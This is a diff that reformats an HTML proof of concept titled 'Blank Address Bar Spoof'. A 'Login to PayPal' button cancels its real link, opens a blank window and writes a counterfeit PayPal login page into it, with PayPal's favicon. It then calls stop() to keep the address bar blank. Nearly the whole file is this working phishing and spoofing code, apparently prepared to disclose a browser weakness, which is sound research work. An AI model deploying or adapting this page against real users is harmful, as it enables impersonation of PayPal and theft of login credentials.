@@ -1,47 +1,46 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>PoC - Blank Address Bar Spoof</title>
-  <style>
-    .paypal-button {
-      background-color: #ffc439;
-      background-image: linear-gradient(to bottom, #ffc439, #ffb347);
-      border: none;
-      border-radius: 25px;
-      color: #1c1c1c;
-      cursor: pointer;
-      display: inline-block;
-      font-family: Arial, sans-serif;
-      font-size: 16px;
-      font-weight: bold;
-      padding: 12px 30px;
-      text-decoration: none;
-      text-align: center;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-    }
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-  </style>
-</head>
-<body>
-
-<script>
-function pwned() {
-  var t = window.open('', 'ss');
-  t.document.write(`
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PoC - Blank Address Bar Spoof</title>
+    <style>
+      .paypal-button {
+        background-color: #ffc439;
+        background-image: linear-gradient(to bottom, #ffc439, #ffb347);
+        border: none;
+        border-radius: 25px;
+        color: #1c1c1c;
+        cursor: pointer;
+        display: inline-block;
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+        font-weight: bold;
+        padding: 12px 30px;
+        text-decoration: none;
+        text-align: center;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      }
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      function pwned() {
+        var t = window.open("", "ss");
+        t.document.write(`
     <!DOCTYPE html>
     <html>
     <head>
       <title>PayPal - Log In</title>
-      <link rel="icon" type="image/x-icon" href="https://www.paypal.com/favicon.ico">
+            <link rel="icon" type="image/x-icon" href="https://www.paypal.com/favicon.ico">
       <style>
         * {
           margin: 0;
@@ -153,13 +152,19 @@ function pwned() {
     </body>
     </html>
   `);
-  t.stop();
-}
-</script>
+        t.stop();
+      }
+    </script>
 
-  <a href="https://legitsite.com" onclick="setTimeout(pwned, 500); return false;" class="paypal-button">
-    🔒 Login to PayPal
-  </a>
-
-</body>
+    <a
+      href="https://legitsite.com"
+      onclick="
+        setTimeout(pwned, 500);
+        return false;
+      "
+      class="paypal-button"
+    >
+      🔒 Login to PayPal
+    </a>
+  </body>
 </html>
